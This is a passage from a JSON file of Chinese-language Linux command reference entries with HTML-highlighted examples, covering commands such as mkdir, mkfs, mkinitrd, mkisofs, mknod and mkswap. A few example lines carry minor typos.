class=\"hljs-string\">100baseTx-HD</span> <span class=\"hljs-string\">10baseT-FD</span> <span class=\"hljs-string\">10baseT-HD</span>\n</code></pre>\n<p>注：是不是已经改过来了？当然，我们也一样用ethtool工具来更改，比如执行下面的命令：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># ethtool -s eth0 speed 100 duplex full</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mkbootdisk",
        "des": "可建立目前系统的启动盘",
        "body": "<h1 id=\"mkbootdisk\">mkbootdisk</h1>\n<p>可建立目前系统的启动盘</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mkbootdisk命令</strong> 用来为当前运行的系统创建能够单独使用的系统引导软盘，以便在系统出现故障时能够启动操作进行适当的修复工作。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mkbootdisk</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--device&lt;设备&gt;：指定设备；</span>\n<span class=\"hljs-comment\">--mkinitrdargs&lt;参数&gt;：设置mkinitrd的参数；</span>\n<span class=\"hljs-comment\">--noprompt：不会提示用户插入磁盘；</span>\n<span class=\"hljs-comment\">--verbose：执行时显示详细的信息；</span>\n<span class=\"hljs-comment\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>内核：指定内核版本。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">mkbootdisk --device <span class=\"hljs-regexp\">/dev/</span>fd0 `uname -r`\n</code></pre>\n<p>其中，<code>uname -r</code>是目前Linux 系统所使用的核心版本，如果你有多个核心版本的话，你以可以直接输入核心版本。例如在这个网页中所使用的核心有两个版本，一个是2.2.12-20，另一个是2.2.18，若要以2.2.18设定开机的话，可以使用：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mkbootdisk</span> --device /dev/fd0 <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">18</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mkdir",
        "des": "用来创建目录",
        "body": "<h1 id=\"mkdir\">mkdir</h1>\n<p>用来创建目录</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mkdir命令</strong> 用来创建目录。该命令创建由dirname命名的目录。如果在目录名的前面没有加任何路径名，则在当前目录下创建由dirname指定的目录；如果给出了一个已经存在的路径，将会在该目录下创建一个指定的目录。在创建目录时，应保证新建的目录与它所在目录下的文件没有重名。&nbsp;</p>\n<p>注意：在创建文件时，不要把所有的文件都存放在主目录中，可以创建子目录，通过它们来更有效地组织文件。最好采用前后一致的命名方式来区分文件和目录。例如，目录名可以以大写字母开头，这样，在目录列表中目录名就出现在前面。</p>\n<p>在一个子目录中应包含类型相似或用途相近的文件。例如，应建立一个子目录，它包含所有的数据库文件，另有一个子目录应包含电子表格文件，还有一个子目录应包含文字处理文档，等等。目录也是文件，它们和普通文件一样遵循相同的命名规则，并且利用全路径可以唯一地指定一个目录。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mkdir</span> <span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-Z：设置安全上下文，当使用SELinux时有效；</span>\n<span class=\"hljs-deletion\">-m&lt;目标属性&gt;或--mode&lt;目标属性&gt;建立目录的同时设置目录的权限；</span>\n<span class=\"hljs-deletion\">-p或--parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录；</span>\n<span class=\"hljs-deletion\">--version 显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目录：指定要创建的目录列表，多个目录之间用空格隔开。</p>\n<h3 id=\"实例\">实例</h3>\n<p>在目录<code>/usr/meng</code>下建立子目录test，并且只有文件主有读、写和执行权限，其他人无权访问</p>\n<pre><code class=\"language-shell\">mkdir -m <span class=\"hljs-number\">700</span> <span class=\"hljs-regexp\">/usr/m</span>eng/test\n</code></pre>\n<p>在当前目录中建立bin和bin下的os_1目录，权限设置为文件主可读、写、执行，同组用户可读和执行，其他用户无权访问</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mkdir</span> -p-m <span class=\"hljs-number\">750</span> bin/os_1\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mke2fs",
        "des": "创建磁盘分区上的“etc2/etc3”文件系统",
        "body": "<h1 id=\"mke2fs\">mke2fs</h1>\n<p>创建磁盘分区上的“etc2/etc3”文件系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mke2fs命令</strong> 被用于创建磁盘分区上的“etc2/etc3”文件系统。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mke2fs</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b&lt;区块大小&gt;：指定区块大小，单位为字节；</span>\n<span class=\"hljs-deletion\">-c；检查是否有损坏的区块；</span>\n<span class=\"hljs-deletion\">-f&lt;不连续区段大小&gt;：指定不连续区段的大小，单位为字节；</span>\n<span class=\"hljs-deletion\">-F：不管指定的设备为何，强制执行mke2fs；</span>\n<span class=\"hljs-deletion\">-i&lt;字节&gt;：指定\"字节/inode\"的比例；</span>\n<span class=\"hljs-deletion\">-N&lt;inode数&gt;：指定要建立的inode数目；</span>\n<span class=\"hljs-deletion\">-l&lt;文件&gt;：从指定的文件中，读取文件西中损坏区块的信息；</span>\n<span class=\"hljs-deletion\">-L&lt;标签&gt;：设置文件系统的标签名称；</span>\n<span class=\"hljs-deletion\">-m&lt;百分比值&gt;：指定给管理员保留区块的比例，预设为5%；</span>\n<span class=\"hljs-deletion\">-M：记录最后一次挂入的目录；</span>\n<span class=\"hljs-deletion\">-q：执行时不显示任何信息；</span>\n<span class=\"hljs-deletion\">-r：指定要建立的ext2文件系统版本；</span>\n<span class=\"hljs-deletion\">-R=&lt;区块数&gt;：设置磁盘阵列参数；</span>\n<span class=\"hljs-deletion\">-S：仅写入superblock与group descriptors，而不更改inode able inode bitmap以及block bitmap；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细信息；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  设备文件：指定要创建的文件系统的分区设备文件名；</li>\n<li>  块数：指定要创建的文件系统的磁盘块数量。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>创建指定的ext2文件系统。</p>\n<pre><code class=\"language-shell\">mke2fs -q <span class=\"hljs-regexp\">/dev/</span>hda1\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mkfs",
        "des": "用于在设备上创建Linux文件系统",
        "body": "<h1 id=\"mkfs\">mkfs</h1>\n<p>用于在设备上创建Linux文件系统</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mkfs命令</strong> 用于在设备上（通常为硬盘）创建Linux文件系统。mkfs本身并不执行建立文件系统的工作，而是去调用相关的程序来执行。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mkfs</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">fs：指定建立文件系统时的参数；\n<span class=\"hljs-deletion\">-t&lt;文件系统类型&gt;：指定要建立何种文件系统；</span>\n<span class=\"hljs-deletion\">-v：显示版本信息与详细的使用方法；</span>\n<span class=\"hljs-deletion\">-V：显示简要的使用方法；</span>\n<span class=\"hljs-deletion\">-c：在制做档案系统前，检查该partition是否有坏轨。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件系统：指定要创建的文件系统对应的设备文件名；</li>\n<li>  块数：指定文件系统的磁盘块数。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>在<code>/dev/hda5</code>上建一个msdos的档案系统，同时检查是否有坏轨存在，并且将过程详细列出来：</p>\n<pre><code class=\"language-shell\">mkfs -V -t msdos -c <span class=\"hljs-regexp\">/dev/</span>hda5\n\nmkfs -t ext3 <span class=\"hljs-regexp\">/dev/</span>sda6     <span class=\"hljs-regexp\">//</span>将sda6分区格式化为ext3格式\nmkfs -t ext2 <span class=\"hljs-regexp\">/dev/</span>sda7     <span class=\"hljs-regexp\">//</span>将sda7分区格式化为ext2格式\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mkinitrd",
        "des": "建立要载入ramdisk的映像文件",
        "body": "<h1 id=\"mkinitrd\">mkinitrd</h1>\n<p>建立要载入ramdisk的映像文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mkinitrd命令</strong> 建立要载入ramdisk的映像文件，以供Linux开机时载入ramdisk。</p>\n<p>这个是重新封包核心的命令，例如你自己修改了一个设备的驱动，如果这个驱动要加入核心级别的话，就需要对核心进行重新封包，把新加的配置编译到核心内部去！</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mkinitrd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-f：若指定的映像问家名称与现有文件重复，则覆盖现有的文件；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">--omit-scsi-modules：不要载入SCSI模块；</span>\n<span class=\"hljs-deletion\">--preload=&lt;模块名称&gt;：指定要载入的模块；</span>\n<span class=\"hljs-deletion\">--with=&lt;模块名称&gt;：指定要载入的模块；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  映像文件：指定要创建的映像文件；</li>\n<li>  内核版本：指定内核版本。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost tmp]# mkinitrd -v -f myinitrd.img $(uname -r)\nCreating initramfs\nWARNING: using /tmp <span class=\"hljs-keyword\">for</span> temporary files\nLooking <span class=\"hljs-keyword\">for</span> deps of module ide-disk\nLooking <span class=\"hljs-keyword\">for</span> deps of module ext3  jbd\nLooking <span class=\"hljs-keyword\">for</span> deps of module jbd\nUsing modules:  .<span class=\"hljs-regexp\">/kernel/</span>fs<span class=\"hljs-regexp\">/jbd/</span>jbd.ko .<span class=\"hljs-regexp\">/kernel/</span>fs<span class=\"hljs-regexp\">/ext3/</span>ext3.ko\n<span class=\"hljs-regexp\">/sbin/</span>nash -&gt; <span class=\"hljs-regexp\">/tmp/i</span>nitrd.Vz3928<span class=\"hljs-regexp\">/bin/</span>nash\n<span class=\"hljs-regexp\">/sbin/i</span>nsmod.<span class=\"hljs-keyword\">static</span> -&gt; <span class=\"hljs-regexp\">/tmp/i</span>nitrd.Vz3928<span class=\"hljs-regexp\">/bin/i</span>nsmod\n<span class=\"hljs-regexp\">/sbin/u</span>dev.<span class=\"hljs-keyword\">static</span> -&gt; <span class=\"hljs-regexp\">/tmp/i</span>nitrd.Vz3928<span class=\"hljs-regexp\">/sbin/u</span>dev\n<span class=\"hljs-regexp\">/etc/u</span>dev<span class=\"hljs-regexp\">/udev.conf -&gt; /</span>tmp<span class=\"hljs-regexp\">/initrd.Vz3928/</span>etc<span class=\"hljs-regexp\">/udev/u</span>dev.conf\n<span class=\"hljs-keyword\">copy</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-regexp\">/lib/m</span>odules<span class=\"hljs-regexp\">/2.6.9-5.EL/</span>.<span class=\"hljs-regexp\">/kernel/</span>fs<span class=\"hljs-regexp\">/jbd/</span>jbd.ko(elf32-i386) to <span class=\"hljs-regexp\">/tmp/i</span>nitrd.Vz3928<span class=\"hljs-regexp\">/lib/</span>jbd.ko(elf32-i386)\n<span class=\"hljs-keyword\">copy</span> <span class=\"hljs-keyword\">from</span> <span class=\"hljs-regexp\">/lib/m</span>odules<span class=\"hljs-regexp\">/2.6.9-5.EL/</span>.<span class=\"hljs-regexp\">/kernel/</span>fs<span class=\"hljs-regexp\">/ext3/</span>ext3.ko(elf32-i386) to <span class=\"hljs-regexp\">/tmp/i</span>nitrd.Vz3928<span class=\"hljs-regexp\">/lib/</span>ext3.ko(elf32-i386)\nLoading module jbd\nLoading module ext3\n\n[root@localhost tmp]# <span class=\"hljs-keyword\">file</span> myinitrd.img\nmyinitrd.img: gzip compressed data, <span class=\"hljs-keyword\">from</span> Unix, max compression\n\n[root@localhost tmp]# mv myinitrd.img  myinitrd.img.gz\n[root@localhost tmp]# gzip -d myinitrd.img.gz\n[root@localhost tmp]# <span class=\"hljs-keyword\">file</span> myinitrd.img\nmyinitrd.img: ASCII cpio archive (SVR4 with no CRC)\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mkisofs",
        "des": "建立ISO 9660映像文件",
        "body": "<h1 id=\"mkisofs\">mkisofs</h1>\n<p>建立ISO 9660映像文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mkisofs命令</strong> 用来将指定的目录与文件做成ISO&nbsp;9660格式的映像文件，以供刻录光盘。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mkisofs</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a或--all：mkisofs通常不处理备份文件。使用此参数可以把备份文件加到映像文件中；</span>\n<span class=\"hljs-deletion\">-A&lt;应用程序id&gt;或-appid&lt;应用程序ID&gt;：指定光盘的应用程序ID；</span>\n<span class=\"hljs-deletion\">-abstract&lt;摘要文件&gt;：指定摘要文件的文件名；</span>\n<span class=\"hljs-deletion\">-b&lt;开机映像文件&gt;或-eltorito-boot&lt;开机映像文件&gt;：指定在制作可开机光盘时所需的开机映像文件；</span>\n<span class=\"hljs-deletion\">-biblio&lt;ISBN文件&gt;：指定ISBN文件的文件名，ISBN文件位于光盘根目录下，记录光盘的ISBN；</span>\n<span class=\"hljs-deletion\">-c&lt;开机文件名称&gt;：制作可开机光盘时，mkisofs会将开机映像文件中的全-eltorito-catalog&lt;开机文件名称&gt;全部内容作成一个文件；</span>\n<span class=\"hljs-deletion\">-C&lt;盘区编号，盘区编号&gt;：将许多节区合成一个映像文件时，必须使用此参数；</span>\n<span class=\"hljs-deletion\">-copyright&lt;版权信息文件&gt;：指定版权信息文件的文件名；</span>\n<span class=\"hljs-deletion\">-d或-omit-period：省略文件后的句号；</span>\n<span class=\"hljs-deletion\">-D或-disable-deep-relocation：ISO 9660最多只能处理8层的目录，超过8层的部分，RRIP会自动将它们设置成ISO 9660兼容的格式。使用-D参数可关闭此功能；</span>\n<span class=\"hljs-deletion\">-f或-follow-links：忽略符号连接；</span>\n<span class=\"hljs-deletion\">-h：显示帮助；</span>\n<span class=\"hljs-deletion\">-hide&lt;目录或文件名&gt;：使指定的目录或文件在ISO 9660或Rock RidgeExtensions的系统中隐藏；</span>\n<span class=\"hljs-deletion\">-hide-joliet&lt;目录或文件名&gt;：使指定的目录或文件在Joliet系统中隐藏；</span>\n<span class=\"hljs-deletion\">-J或-joliet：使用Joliet格式的目录与文件名称；</span>\n<span class=\"hljs-deletion\">-l或-full-iso9660-filenames：使用ISO 9660 32字符长度的文件名；</span>\n<span class=\"hljs-deletion\">-L或-allow-leading-dots：允许文件名的第一个字符为句号；</span>\n<span class=\"hljs-deletion\">-log-file&lt;记录文件&gt;：在执行过程中若有错误信息，预设会显示在屏幕上；</span>\n<span class=\"hljs-deletion\">-m&lt;目录或文件名&gt;或-exclude&lt;目录或文件名&gt;：指定的目录或文件名将不会房入映像文件中；</span>\n<span class=\"hljs-deletion\">-M&lt;映像文件&gt;或-prev-session&lt;映像文件&gt;：与指定的映像文件合并；</span>\n<span class=\"hljs-deletion\">-N或-omit-version-number：省略ISO 9660文件中的版本信息；</span>\n<span class=\"hljs-deletion\">-o&lt;映像文件&gt;或-output&lt;映像文件&gt;：指定映像文件的名称；</span>\n<span class=\"hljs-deletion\">-p&lt;数据处理人&gt;或-preparer&lt;数据处理人&gt;：记录光盘的数据处理人；</span>\n<span class=\"hljs-deletion\">-print-size：显示预估的文件系统大小；</span>\n<span class=\"hljs-deletion\">-quiet：执行时不显示任何信息；</span>\n<span class=\"hljs-deletion\">-r或-rational-rock：使用Rock Ridge Extensions，并开放全部文件的读取权限；</span>\n<span class=\"hljs-deletion\">-R或-rock：使用Rock Ridge Extensions；</span>\n<span class=\"hljs-deletion\">-sysid&lt;系统ID&gt;：指定光盘的系统ID；</span>\n<span class=\"hljs-deletion\">-T或-translation-table：建立文件名的转换表，适用于不支持Rock Ridge Extensions的系统上；</span>\n<span class=\"hljs-deletion\">-v或-verbose：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-V&lt;光盘ID&gt;或-volid&lt;光盘ID&gt;：指定光盘的卷册集ID；</span>\n<span class=\"hljs-deletion\">-volset-size&lt;光盘总数&gt;：指定卷册集所包含的光盘张数；</span>\n<span class=\"hljs-deletion\">-volset-seqno&lt;卷册序号&gt;：指定光盘片在卷册集中的编号；</span>\n<span class=\"hljs-deletion\">-x&lt;目录&gt;：指定的目录将不会放入映像文件中；</span>\n<span class=\"hljs-deletion\">-z：建立通透性压缩文件的SUSP记录，此记录目前只在Alpha机器上的Linux有效。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>路径：需要添加到映像文件中的路径。</p>\n<h3 id=\"实例\">实例</h3>\n<p>linux中用mkisofs命令把文件制作成ISO步骤：</p>\n<p>把NFS服务器上的目录挂载到本地/mnt/nfs/的目录：</p>\n<pre><code class=\"language-shell\">mount -t nfs <span class=\"hljs-number\">10.0</span>.<span class=\"hljs-number\">2.2</span>:<span class=\"hljs-regexp\">/linuxos/</span>rhel4.<span class=\"hljs-number\">0</span>_update3<span class=\"hljs-regexp\">/ /m</span>nt<span class=\"hljs-regexp\">/nfs/</span>\n</code></pre>\n<p>把已挂载的文件复制到本地：</p>\n<pre><code class=\"language-shell\">cp -a <span class=\"hljs-regexp\">/mnt/</span>NFS<span class=\"hljs-regexp\">/* /</span>root<span class=\"hljs-regexp\">/Decp -a /m</span>nt<span class=\"hljs-regexp\">/nfs/</span>* <span class=\"hljs-regexp\">/root/</span>Desktop<span class=\"hljs-regexp\">/rhel4.0/</span>&amp;sktop<span class=\"hljs-regexp\">/rhel4.0/</span>&amp;\n</code></pre>\n<p>查找boot.cat文件并删除掉：</p>\n<pre><code class=\"language-shell\">find rhel4.0/ -name <span class=\"hljs-keyword\">boot</span>.<span class=\"hljs-keyword\">cat</span> | xargs <span class=\"hljs-keyword\">rm</span>\n</code></pre>\n<p>查找TRANS.TBL文件并删除掉：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> rhel4.<span class=\"hljs-number\">0</span>/ -<span class=\"hljs-built_in\">name</span> TRANS.TBL -<span class=\"hljs-built_in\">exec</span> rm {} \\;\n</code></pre>\n<p>复制本地的所需文件到指定目录：</p>\n<pre><code class=\"language-shell\">cp <span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/comps/i</span>386<span class=\"hljs-regexp\">/.discinfo rhel4.0/</span>\n</code></pre>\n<p>把指定目录下的所有文件制作成ISO文件：</p>\n<pre><code class=\"language-shell\">mkisofs -R -J -T -v -<span class=\"hljs-keyword\">no</span>-emul-<span class=\"hljs-keyword\">boot</span> -<span class=\"hljs-keyword\">boot</span>-load-size 4 -<span class=\"hljs-keyword\">boot</span>-info-<span class=\"hljs-keyword\">table</span> -V RHEL4ASDVD -b isolinux/isolinux.bin -c isolinux/<span class=\"hljs-keyword\">boot</span>.<span class=\"hljs-keyword\">cat</span> -o /RHEL4AS.iso rhel4.0/\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mknod",
        "des": "创建字符设备文件和块设备文件",
        "body": "<h1 id=\"mknod\">mknod</h1>\n<p>创建字符设备文件和块设备文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mknod命令</strong> 用于创建Linux中的字符设备文件和块设备文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mknod</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-Z：设置安全的上下文；</span>\n<span class=\"hljs-deletion\">-m：设置权限模式；</span>\n<span class=\"hljs-deletion\">-help：显示帮助信息；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件名：要创建的设备文件名；</li>\n<li>  类型：指定要创建的设备文件的类型；</li>\n<li>  主设备号：指定设备文件的主设备号；</li>\n<li>  次设备号：指定设备文件的次设备号。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ls</span> -la /dev/ttyUSB*\n<span class=\"hljs-attribute\">crw</span>-rw—- <span class=\"hljs-number\">1</span> root dialout <span class=\"hljs-number\">188</span>, <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">2008</span>-<span class=\"hljs-number\">02</span>-<span class=\"hljs-number\">13</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">32</span> /dev/ttyUSB0\n<span class=\"hljs-attribute\">mknod</span> /dev/ttyUSB32 c <span class=\"hljs-number\">188</span> <span class=\"hljs-number\">32</span>\n</code></pre>\n<h3 id=\"扩展知识\">扩展知识</h3>\n<p>Linux的设备管理是和文件系统紧密结合的，各种设备都以文件的形式存放在/dev目录 下，称为设备文件。应用程序可以打开、关闭和读写这些设备文件，完成对设备的操作，就像操作普通的数据文件一样。</p>\n<p>为了管理这些设备，系统为设备编了号，每 个设备号又分为主设备号和次设备号。主设备号用来区分不同种类的设备，而次设备号用来区分同一类型的多个设备。对于常用设备，Linux有约定俗成的编 号，如硬盘的主设备号是3。</p>\n<p>Linux为所有的设备文件都提供了统一的操作函数接口，方法是使用数据结构struct file_operations。这个数据结构中包括许多操作函数的指针，如open()、close()、read()和write()等，但由于外设 的种类较多，操作方式各不相同。Struct file_operations结构体中的成员为一系列的接口函数，如用于读/写的read/write函数和用于控制的ioctl等。</p>\n<p>打开一个文件就是调用这个文件file_operations中的open操作。不同类型的文件有不同的file_operations成员函数，如普通的磁盘数据文件， 接口函数完成磁盘数据块读写操作；而对于各种设备文件，则最终调用各自驱动程序中的I/O函数进行具体设备的操作。这样，应用程序根本不必考虑操作的是设 备还是普通文件，可一律当作文件处理，具有非常清晰统一的I/O接口。所以file_operations是文件层次的I/O接口。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mkswap",
        "des": "建立和设置SWAP交换分区",
        "body": "<h1 id=\"mkswap\">mkswap</h1>\n<p>建立和设置SWAP交换分区</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mkswap命令</strong> 用于在一个文件或者设备上建立交换分区。在建立完之后要使用sawpon命令开始使用这个交换区。最后一个选择性参数指定了交换区的大小，但是这个参数是为了向后兼容设置的，没有使用的必要，一般都将整个文件或者设备作为交换区。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mkswap</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：建立交换区前，先检查是否有损坏的区块；</span>\n<span class=\"hljs-deletion\">-f：在SPARC电脑上建立交换区时，要加上此参数；</span>\n<span class=\"hljs-deletion\">-v0：建立旧式交换区，此为预设值；</span>\n<span class=\"hljs-deletion\">-v1：建立新式交换区。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>设备：指定交换空间对应的设备文件或者交换文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>查看系统swap space大小：</strong> </p>\n<pre><code class=\"language-shell\">free -m\ntotal used free shared buffers cached\nMem:<span class=\"hljs-number\"> 377 </span>180<span class=\"hljs-number\"> 197 </span>0<span class=\"hljs-number\"> 19 </span>110\n-/+ buffers/cache:<span class=\"hljs-number\"> 50 </span>327\nSwap:<span class=\"hljs-number\"> 572 </span>0 572\n</code></pre>\n<p> <strong>查看当前的swap空间(file(s)/partition(s))：</strong> </p>\n<pre><code class=\"language-shell\">swapon -s\n\n等价于\n\ncat <span class=\"hljs-regexp\">/proc/</span>swaps\n</code></pre>\n<p> <strong>添加交换空间</strong> </p>\n<p>添加一个 <strong>交换分区</strong> 或添加一个 <strong>交换文件</strong> 。推荐你添加一个交换分区；不过，若你没有多少空闲空间可用，则添加交换文件。</p>\n<p>添加一个交换分区，步骤如下：</p>\n<p>使用fdisk来创建交换分区（假设 /dev/sdb2 是创建的交换分区），使用 mkswap 命令来设置交换分区：</p>\n<pre><code class=\"language-shell\">mkswap <span class=\"hljs-regexp\">/dev/</span>sdb2\n</code></pre>\n<p>启用交换分区：</p>\n<pre><code class=\"language-shell\">swapon <span class=\"hljs-regexp\">/dev/</span>sdb2\n</code></pre>\n<p>写入<code>/etc/fstab</code>，以便在引导时启用：</p>\n<pre><code class=\"language-shell\">/dev/sdb2 <span class=\"hljs-keyword\">swap</span> <span class=\"hljs-keyword\">swap</span> defaults <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>添加一个交换文件，步骤如下：</p>\n<p>创建大小为512M的交换文件：</p>\n<pre><code class=\"language-shell\">dd <span class=\"hljs-attribute\">if</span>=/dev/zero <span class=\"hljs-attribute\">of</span>=/swapfile1 <span class=\"hljs-attribute\">bs</span>=1024 <span class=\"hljs-attribute\">count</span>=524288\n</code></pre>\n<p>使用mkswap命令来设置交换文件：</p>\n<pre><code class=\"language-shell\">mkswap <span class=\"hljs-string\">/swapfile1</span>\n</code></pre>\n<p>启用交换分区：</p>\n<pre><code class=\"language-shell\">swapon <span class=\"hljs-string\">/swapfile1</span>\n</code></pre>\n<p>写入<code>/etc/fstab</code>，以便在引导时启用：</p>\n<pre><code class=\"language-shell\">/swapfile1 <span class=\"hljs-keyword\">swap</span> <span class=\"hljs-keyword\">swap</span> defaults <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0</span>\n</code></pre>\n<p>新添了交换分区并启用它之后，请查看<code>cat /proc/swaps</code>或free命令的输出来确保交换分区已被启用了。</p>\n<p> <strong>删除交换空间：</strong> </p>\n<p>禁用交换分区：</p>\n<pre><code class=\"language-shell\">swapoff <span class=\"hljs-regexp\">/dev/</span>sdb2\n</code></pre>\n<p>从<code>/etc/fstab</code>中删除项目，使用fdisk或yast工具删除分区。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "mktemp",
        "des": "创建临时文件供shell脚本使用",
        "body": "<h1 id=\"mktemp\">mktemp</h1>\n<p>创建临时文件供shell脚本使用</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>mktemp命令</strong> 被用来创建临时文件供shell脚本使用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">mktemp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-q：执行时若发生错误，不会显示任何信息；</span>\n<span class=\"hljs-deletion\">-u：暂存文件会在mktemp结束前先行删除；</span>\n<span class=\"hljs-deletion\">-d：创建一个目录而非文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定创建的临时文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "modprobe",
        "des": "自动处理可载入模块",
